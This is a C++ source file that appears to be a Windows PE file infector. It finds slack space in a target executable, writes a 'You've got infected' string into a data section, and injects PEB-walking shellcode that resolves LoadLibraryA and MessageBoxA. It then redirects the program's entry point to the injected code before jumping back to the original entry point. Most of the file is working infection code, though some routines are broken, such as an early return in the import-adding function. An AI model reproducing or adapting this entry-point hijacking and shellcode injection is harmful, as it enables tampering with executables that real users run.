#include <map>
#include <vector>
#include <string>
#include <utility>
#include <iostream>

#include "initializeValue.h"
#include "getInfoOfFile.h"
#include "addCodeToFile.h"

using namespace std;

vector< pair<string, vector<string> > > importFunctions;
vector<vector<int> > offsetOfImportFunctions;
vector<int> offsetOfDlls;
vector<int> offsetOfFirstThunk;
int diffRVAandOffset;
vector<vector<int> > RVAOfFunction;
map<string, vector<int> > assemblySyntax;
vector<int> RVAuserData;

bool canAddCode = true;

void initImportFunctions() {
    pair<string, vector<string> > dllFunctions;

    // sample of adding new dllFunctions
    dllFunctions.second = vector<string>();
    dllFunctions.first = "user32.dll";
    dllFunctions.second.push_back("MessageBoxA");
    // dllFunctions.second.push_back("GetMessageA");
    importFunctions.push_back(dllFunctions);
}

int convertOffsetToRVA(int offset) {
    int offsetOfPE = getIntValueFromFileData(60, 4); // 0x3C = 60.... 0X3C -> 0X3F
    // int imageBase = getValueOfField("imageBase", offsetOfPE);
    int RVA = offset - diffRVAandOffset;
    return RVA;
}

vector<int> toRVAArray(int RVA) {
    vector<int> res(4);

    vector<int> base16OfRVA(8);
    for(int i = 7; i >= 0; i--) {
        base16OfRVA[i] = RVA % 16;
        RVA /= 16;
    }
    for(int i = 0; i < 4; i++) {
        int x = base16OfRVA[7-i*2-1]*16 + base16OfRVA[7-i*2];
        res[i] = x;
    }
    return res;
}

vector<int> genDllAndFunctionData(int baseOffset) {
    vector<int> res;
    for (int i = 0; i < importFunctions.size(); i++) {
        offsetOfDlls.push_back(res.size() + baseOffset);
        string dllName = importFunctions[i].first;
        for (int ii = 0; ii < dllName.size(); ii++) {
            res.push_back((int)dllName[ii]);
        }
        res.push_back(0);
        vector<int> offsetOfThisDllFunctions;
        
        for (int j = 0; j < importFunctions[i].second.size(); j++) {
            offsetOfThisDllFunctions.push_back(res.size() + baseOffset);
            res.push_back(0); res.push_back(0); // 2 byte of zero for Hint
            string functionName = importFunctions[i].second[j];
            for (int ii = 0; ii < functionName.size(); ii++) {
                res.push_back((int)functionName[ii]);
            }
            res.push_back(0);
        }
        offsetOfImportFunctions.push_back(offsetOfThisDllFunctions);
    }
    // printf("\n%.8X\t\t", 0);
    // for(int i = 0; i < res.size(); i++) {
    //     printf("%02X ", res[i]);
    //     if ((i + 1) % 16 == 0)
    //         printf("\n%.8X\t\t", i+1);
    // }
    return res;
}

int calSpaceForDllFuntion() {
    int spaceForDllFuntion = 0;
    for (int i = 0; i < importFunctions.size(); i++) {
        string dllName = importFunctions[i].first;
        spaceForDllFuntion += dllName.size() + 1; // 1 byte of /00
        for (int j = 0; j < importFunctions[i].second.size(); j++) {
            string functionName = importFunctions[i].second[j];
            spaceForDllFuntion += functionName.size() + 2 + 1; // 2 byte of zero for Hint + 1 byte of /00
            spaceForDllFuntion += 4; 
        }
    }
    return spaceForDllFuntion;
}

vector<int> gendataOfNewIID() {
    vector<int> res;
    vector<int> zero4(4, 0);
    for (int i = 0; i < offsetOfDlls.size(); i++) {
        vector<int> firstThunkRVA = toRVAArray(convertOffsetToRVA(offsetOfFirstThunk[i]));
        vector<int> name1RVA = toRVAArray(convertOffsetToRVA(offsetOfDlls[i]));

        res.insert(res.end(), firstThunkRVA.begin(), firstThunkRVA.end()); // Original First Thunk
        res.insert(res.end(), zero4.begin(), zero4.end()); // TimeDataStamp
        res.insert(res.end(), zero4.begin(), zero4.end()); // Forward Chain
        res.insert(res.end(), name1RVA.begin(), name1RVA.end()); // Name1
        res.insert(res.end(), firstThunkRVA.begin(), firstThunkRVA.end()); // FirstThunk
    }
    for (int i = 0; i < 5; i++) { // end of IID
        res.insert(res.end(), zero4.begin(), zero4.end());
    }
    return res;
}

int calSpaceForRVA() {
    int spaceForRVA = 0;
    for (int i = 0; i < importFunctions.size(); i++) {
        spaceForRVA += importFunctions[i].second.size() * 4; // image Thunks Data contain RVA to this function
        spaceForRVA += 4; // endl of image Thunk Data
    }
    return spaceForRVA;
}

vector<int> genRVAData(int baseOffset) {
    vector<int> res;
    int offset = 0;
    for (int i = 0; i < offsetOfDlls.size(); i++) {
        offsetOfFirstThunk.push_back(offset + baseOffset);
        vector<int> RVAOfThisDllFunction;
        for (int j = 0; j < offsetOfImportFunctions[i].size(); j++) {
            vector<int> RVA = toRVAArray(convertOffsetToRVA(offsetOfImportFunctions[i][j]));
            res.insert(res.end(), RVA.begin(), RVA.end());
            RVAOfThisDllFunction.push_back(convertOffsetToRVA(offset + baseOffset));
            offset += 4;
        }
        vector<int> zero4(4, 0);
        res.insert(res.end(), zero4.begin(), zero4.end());
        RVAOfFunction.push_back(RVAOfThisDllFunction);
    }

    return res;
}

// @ Put IID at the end of import section
// @ Add dll we need to IID
vector<int> addImportFunctions() {
    vector<int> outputData = fileData;

    return outputData;

    int offsetOfPE = getIntValueFromFileData(60, 4); // 0x3C = 60.... 0X3C -> 0X3F
    int imageBase = getValueOfField("imageBase", offsetOfPE);
    int RVAImportTable = getValueOfField("importTableRVA", offsetOfPE);

    if (RVAImportTable == 0) {
        cout << "I can't add import Functions in this file........... because there are not a import section" << endl;
        canAddCode = false;
        return outputData;
    }

    offsetInDataDicrectory["RVAImportTable"] = RVAImportTable;
    getImportSectionData();
    int offsetImportTable = offsetInDataDicrectory["offsetImportTable"];
    int sizeOfImportSection = offsetInDataDicrectory["sizeImportTable"];

    diffRVAandOffset = offsetImportTable - RVAImportTable;
    //@ Fomular RVA = [offset] - diffRVAandOffset + imageBase;

    printf("RVAImportTable: %.8X\t\t", RVAImportTable);
    printf("offsetImportTable: %.8X\t\t\n\n", offsetImportTable);

    int firstOffsetImportTable = offsetImportTable;
    int numberOfIID = 0;
    const int sizeOfIID = 4 * 5;

    while (true) {
        int RVAName1 = getValueOfField("name1", offsetImportTable);
        int RVAFirstThunk = getValueOfField("firstThunk", offsetImportTable);   
        if (RVAName1 == 0 && RVAFirstThunk == 0) {
            break;
        }
        numberOfIID++;
        offsetImportTable += sizeOfParts["IAT"] = sizeOfIID;
    }
    int IIDSpace = numberOfIID * sizeOfIID;
    int lastOffsetImportTable = firstOffsetImportTable + IIDSpace- 1;

    int spaceForIID = (numberOfIID + importFunctions.size() + 1) * sizeOfIID; // +1 of end of IID
    int spaceForDllFuntion = calSpaceForDllFuntion();
    int spaceForRVA = calSpaceForRVA();
    int spaceNeed = spaceForIID + spaceForDllFuntion + spaceForRVA;

    int sectionAlignment = getValueOfField("sectionAlignment", offsetOfPE);
    int firstOffsetImportSection = offsetInDataDicrectory["rawAddressImportSection"];
    int lastOffsetImportSection = firstOffsetImportSection + sizeOfImportSection - 1;
    int startOffset = lastOffsetImportSection - spaceNeed + 1;
    startOffset = (startOffset / 16) * 16;

    printf("firstOffsetImportTable: %.8X\t\t", firstOffsetImportTable);
    printf("lastOffsetImportTable: %.8X\t\t\n\n", lastOffsetImportTable);
    printf("sizeOfImportSection: %.8X\n\n", sizeOfImportSection);
    printf("firstOffsetImportSection: %.8X\n\n", firstOffsetImportSection);
    printf("lastOffsetImportSection: %.8X\n\n", lastOffsetImportSection);
    printf("spaceNeed: %.8X\n\n", spaceNeed);
    printf("startOffset: %.8X\n", startOffset);

    bool isEnoughSpace = true;
    for (int i = startOffset; i <= lastOffsetImportSection; i++) {
        isEnoughSpace = isEnoughSpace && outputData[i] == 0;
    }
    if (!isEnoughSpace) {
        cout << "I can't add import library in to this file........... because not enough space for import dll and functions." << endl;
        canAddCode = false;
        return outputData;
    }

    //@ Must keep this order of getting data
    vector<int> dataOfIID = getRawValueFromFileData(firstOffsetImportTable, IIDSpace);
    vector<int> dllAndFunctionData = genDllAndFunctionData(startOffset + spaceForIID + spaceForRVA);
    vector<int> RVAData = genRVAData(startOffset + spaceForIID);
    vector<int> dataOfNewIID = gendataOfNewIID();
    vector<int> dataOfNewImport = dataOfIID;
    dataOfNewImport.insert(dataOfNewImport.end(), dataOfNewIID.begin(), dataOfNewIID.end());
    dataOfNewImport.insert(dataOfNewImport.end(), RVAData.begin(), RVAData.end());
    dataOfNewImport.insert(dataOfNewImport.end(), dllAndFunctionData.begin(), dllAndFunctionData.end());
    // printf("\n%.8X\t\t", 0);
    // for(int i = 0; i < dataOfNewIID.size(); i++) {
    //     printf("%02X ", dataOfNewIID[i]);
    //     if ((i + 1) % 16 == 0)
    //         printf("\n%.8X\t\t", i+1);
    // }
    int j = 0;
    for (int i = startOffset; i <= lastOffsetImportSection; i++) {
        outputData[i] = dataOfNewImport[j];
        j++;
        if (j > dataOfNewImport.size()) {
            break;
        }
    }

    // Change RVA point to Import In Data Directory
    int offsetOfImport = offsetOfParts["importTableRVA"] + offsetOfPE;
    // printf("offsetOfParts[importTableRVA] : %.8X\n", offsetOfImport);
    int newRVAImport = startOffset - diffRVAandOffset;
    // printf("new RVA Import : %.8X\n", newRVAImport);
    vector<int> newRVAImportVector = toRVAArray(newRVAImport);
    for (int i = 0; i < 3; i++) {
        outputData[offsetOfImport + i] = newRVAImportVector[i];
    }

    // Change Size of Import Section
    int offsetImportSection = offsetInDataDicrectory["offsetImportSection"];
    int offsetVirtualSize = offsetInDataDicrectory["offsetImportSection"] + offsetOfParts["virtualSize"];
    int rawSizeImportSection = getValueOfField("sizeOfRawData", offsetImportSection);
    // printf("rawSizeImportSection: %.8X\n", rawSizeImportSection);
    // printf("offsetImportSection: %.8X\n", offsetImportSection);
    vector<int> newVirtualSize = toRVAArray(rawSizeImportSection);
    for (int i = 0; i < 3; i++) {
        outputData[offsetVirtualSize + i] = newVirtualSize[i];
    }

    // Change 
    return outputData;
}

int getOffsetOfCodeSection() {
    int offsetOfPE = getIntValueFromFileData(60, 4); // 0x3C = 60.... 0X3C -> 0X3F
    int originalEntryPoint = getValueOfField("addressOfEntryPoint", offsetOfPE);
    int numberOfSection = getValueOfField("numberOfSections", offsetOfPE);
    int sizeOfOneSection = sizeOfParts["Section"];
    int offsetOfSection = offsetOfParts["DataDirectories"] + offsetOfPE + sizeOfParts["DataDirectories"];
    for (int section = 0; section < numberOfSection; section++) {
        int firstOffsetOfSection = getValueOfField("virutalAddress", offsetOfSection);
        int lastOffsetOfSection = firstOffsetOfSection + getValueOfField("virtualSize", offsetOfSection);
        if (firstOffsetOfSection <= originalEntryPoint && originalEntryPoint <= lastOffsetOfSection) {
            return offsetOfSection;
        }
        offsetOfSection += sizeOfOneSection;
    }
    return 0;
}

int getOffsetOfDataSection(vector<int> outputData, int lengthOfData) {
    int offsetOfPE = getIntValueFromFileData(60, 4); // 0x3C = 60.... 0X3C -> 0X3F
    int originalEntryPoint = getValueOfField("addressOfEntryPoint", offsetOfPE);
    int numberOfSection = getValueOfField("numberOfSections", offsetOfPE);
    int sizeOfOneSection = sizeOfParts["Section"];
    int offsetOfSection = offsetOfParts["DataDirectories"] + offsetOfPE + sizeOfParts["DataDirectories"];
    for (int section = 0; section < numberOfSection; section++) {
        string nameOfSection = getStringFromFileData(offsetOfParts["name"] + offsetOfSection);
        transform(nameOfSection.begin(), nameOfSection.end(), nameOfSection.begin(), ::tolower);
        int firstOffsetOfSection = getValueOfField("pointerToRawData", offsetOfSection);
        int lastOffsetOfSection = firstOffsetOfSection + getValueOfField("sizeOfRawData", offsetOfSection);
        bool isSectionEmpty = true;
        for (int i = lastOffsetOfSection - lengthOfData; i <= lastOffsetOfSection; i++) {
            isSectionEmpty = (outputData[i] == 0) && isSectionEmpty;
        }
        bool isCodeSection = firstOffsetOfSection <= originalEntryPoint && originalEntryPoint <= lastOffsetOfSection;
        // if (nameOfSection.find("data") != string::npos && isSectionEmpty) {
        if (!isCodeSection && isSectionEmpty) {
            return offsetOfSection;
        }
        offsetOfSection += sizeOfOneSection;
    }
    return 0;
}

vector<int> addUserDataToDataSection(vector<int> rawData) {
    vector<int> outputData = rawData;
    // return outputData;
    int offsetOfPE = getIntValueFromFileData(60, 4); // 0x3C = 60.... 0X3C -> 0X3F
    int imageBase = getValueOfField("imageBase", offsetOfPE);
    const int numberOfData = 1;
    int lengthOfData =  0;
    vector< vector<int> > userData;
    vector<int> messageBoxContent = {0x59, 0x6f, 0x75, 0x27, 0x76, 0x65, 0x20, 0x67, 0x6f, 0x74, 0x20, 0x69, 0x6e, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x00}; // You've got infected
    lengthOfData += messageBoxContent.size();
    userData.push_back(messageBoxContent);

    int offsetDataSection = getOffsetOfDataSection(outputData, lengthOfData);
    if (offsetDataSection == 0) {
        cout << "Can't Add Data to file.. because there are no section which contain enough space for user data \n";
        canAddCode = false;
    }
    int virtualAddressDataSection = getValueOfField("virutalAddress", offsetDataSection);
    int rawOffsetDataSection = getValueOfField("pointerToRawData", offsetDataSection);
    int diffRVAandOffsetDataSetion = rawOffsetDataSection - virtualAddressDataSection;

    // Reset VirtualSize of data section
    int offsetVirtualSize = offsetOfParts["virtualSize"] + offsetDataSection;
    int rawSizeDataSection = getValueOfField("sizeOfRawData", offsetDataSection);
    vector<int> newVirtualSizeDataSection = toRVAArray(rawSizeDataSection);
    for (int i = 0; i < 3; i++) {
        outputData[offsetVirtualSize + i] = newVirtualSizeDataSection[i];
    }

    // Add Data
    int lastOffsetDataSection = rawOffsetDataSection + rawSizeDataSection - 1;
    int startOffset = lastOffsetDataSection - lengthOfData + 1;
    startOffset = (startOffset / 16) * 16;

    int index = startOffset;
    for (int i = 0; i < numberOfData; i++) {
        RVAuserData.push_back(index - diffRVAandOffsetDataSetion + imageBase);
        for (int j = 0; j < userData[i].size(); j++) {
            outputData[index] = userData[i][j];
            index++;
        }
    }
    
    return outputData;
}

void initAssemblySyntax() {
    assemblySyntax["CALL"] = vector<int>() = {0xFF, 0x15};
    assemblySyntax["CALL EAX"] = vector<int>() = {0xFF, 0xD0};
    assemblySyntax["MOV"] = vector<int>() = {0xB8};
    assemblySyntax["JMP EAX"] = vector<int>() = {0xFF, 0xE0};
    assemblySyntax["PUSH-BYTE"] = vector<int>() = {0x6A};
    assemblySyntax["PUSH-PTR"] = vector<int>() = {0x68};
}

vector<int> getUserCode() {
    initAssemblySyntax();
    int offsetOfPE = getIntValueFromFileData(60, 4); // 0x3C = 60.... 0X3C -> 0X3F
    int imageBase = getValueOfField("imageBase", offsetOfPE);
    vector<int> code, address;
    code = vector<int>();

    vector<int> zero = {0};

    vector<int> getMessageBoxFunction = {0x31,0xc9,0x64,0x8b,0x41,0x30,0x8b,0x40,0xc,0x8b,0x70,0x14,0xad,0x96,0xad,0x8b,0x58,0x10,0x8b,0x53,0x3c,0x1,0xda,0x8b,0x52,0x78,0x1,0xda,0x8b,0x72,0x20,0x1,0xde,0x31,0xc9,0x41,0xad,0x1,0xd8,0x81,0x38,0x47,0x65,0x74,0x50,0x75,0xf4,0x81,0x78,0x4,0x72,0x6f,0x63,0x41,0x75,0xeb,0x81,0x78,0x8,0x64,0x64,0x72,0x65,0x75,0xe2,0x8b,0x72,0x24,0x1,0xde,0x66,0x8b,0xc,0x4e,0x49,0x8b,0x72,0x1c,0x1,0xde,0x8b,0x14,0x8e,0x1,0xda,0x31,0xc9,0x53,0x52,0x51,0x68,0x61,0x72,0x79,0x41,0x68,0x4c,0x69,0x62,0x72,0x68,0x4c,0x6f,0x61,0x64,0x54,0x53,0xff,0xd2,0x83,0xc4,0xc,0x59,0x50,0x51,0x66,0xb9,0x6c,0x6c,0x51,0x68,0x33,0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x54,0xff,0xd0,0x83,0xc4,0x10,0x8b,0x54,0x24,0x4,0xb9,0x6f,0x78,0x41,0x0,0x51,0x68,0x61,0x67,0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x54,0x50,0xff,0xd2,0x83,0xc4,0x10};
    
    // @ getMessageBoxFunction from user32.dll
    code.insert(code.end(), getMessageBoxFunction.begin(), getMessageBoxFunction.end());

    // @ Push variable 4
    code.insert(code.end(), assemblySyntax["PUSH-BYTE"].begin(), assemblySyntax["PUSH-BYTE"].end());
    code.insert(code.end(), zero.begin(), zero.end());

    // @ Push variable 3
    code.insert(code.end(), assemblySyntax["PUSH-BYTE"].begin(), assemblySyntax["PUSH-BYTE"].end());
    code.insert(code.end(), zero.begin(), zero.end());

    // @ Push variable 2
    code.insert(code.end(), assemblySyntax["PUSH-PTR"].begin(), assemblySyntax["PUSH-PTR"].end());
    vector<int> RVAMessboxBoxContent = toRVAArray(RVAuserData[0]);
    code.insert(code.end(), RVAMessboxBoxContent.begin(), RVAMessboxBoxContent.end());

    // @ Push variable 1
    code.insert(code.end(), assemblySyntax["PUSH-BYTE"].begin(), assemblySyntax["PUSH-BYTE"].end());
    code.insert(code.end(), zero.begin(), zero.end());

    
    // @ Call function MessageBoxA 
    code.insert(code.end(), assemblySyntax["CALL EAX"].begin(), assemblySyntax["CALL EAX"].end());
    /*
    code.insert(code.end(), assemblySyntax["CALL"].begin(), assemblySyntax["CALL"].end());
    address = toRVAArray(RVAOfFunction[0][0] + imageBase);
    code.insert(code.end(), address.begin(), address.end());
    */

    // @ MOV EAX, OriginalEntryPoint
    code.insert(code.end(), assemblySyntax["MOV"].begin(), assemblySyntax["MOV"].end());
    int originalEntryPoint = getValueOfField("addressOfEntryPoint", offsetOfPE);
    address = toRVAArray(originalEntryPoint + imageBase);
    code.insert(code.end(), address.begin(), address.end());

    // @ JPM EAX
    code.insert(code.end(), assemblySyntax["JMP EAX"].begin(), assemblySyntax["JMP EAX"].end());

    return code;
}

vector<int> addCode(vector<int> rawData) {
    vector<int> outputData = rawData;
    int offsetOfPE = getIntValueFromFileData(60, 4); // 0x3C = 60.... 0X3C -> 0X3F
    int imageBase = getValueOfField("imageBase", offsetOfPE);
    int originalEntryPoint = getValueOfField("addressOfEntryPoint", offsetOfPE);
    
    int offsetCodeSection = getOffsetOfCodeSection();
    int virtualAddressCodeSection = getValueOfField("virutalAddress", offsetCodeSection);
    int rawOffsetCodeSection = getValueOfField("pointerToRawData", offsetCodeSection);
    int diffRVAandOffsetCodeSetion = rawOffsetCodeSection - virtualAddressCodeSection;

    // Reset VirtualSize of code section
    int offsetVirtualSize = offsetOfParts["virtualSize"] + offsetCodeSection;
    int rawSizeCodeSection = getValueOfField("sizeOfRawData", offsetCodeSection);
    vector<int> newVirtualSizeCodeSection = toRVAArray(rawSizeCodeSection);
    for (int i = 0; i < 3; i++) {
        outputData[offsetVirtualSize + i] = newVirtualSizeCodeSection[i];
    }

    // Add Code
    int lastOffsetCodeSection = rawOffsetCodeSection + rawSizeCodeSection - 1;
    vector<int> userCode = getUserCode();
    int startOffset = lastOffsetCodeSection - userCode.size() + 1;
    startOffset = (startOffset / 16) * 16;

    bool isEnoughSpace = true;
    for (int i = startOffset; i <= lastOffsetCodeSection; i++) {
        isEnoughSpace = isEnoughSpace && outputData[i] == 0;
    }
    if (!isEnoughSpace) {
        cout << "I can't add code in to this file........... because not enough space in code section." << endl;
        canAddCode = false;
        return outputData;
    }

    int j = 0;
    for (int i = startOffset; i <= lastOffsetCodeSection; i++) {
        outputData[i] = userCode[j];
        if (j > userCode.size()) {
            break;
        }
        j++;
    }

    // Set new Entry Point
    int offsetEntryPoint = offsetOfParts["addressOfEntryPoint"] + offsetOfPE;
    vector<int> newEntryRVA = toRVAArray(startOffset - diffRVAandOffsetCodeSetion);
    for (int i = 0; i < 3; i++) {
        outputData[offsetEntryPoint + i] = newEntryRVA[i];
    }

    return outputData;
}

vector<int> addCodeToFile() {
    initImportFunctions();
    vector<int> outputData = addImportFunctions();
    if (!canAddCode) {
        return outputData;
    }

    outputData = addUserDataToDataSection(outputData);
    if (!canAddCode) {
        return outputData;
    }
    outputData = addCode(outputData);
    return outputData;
}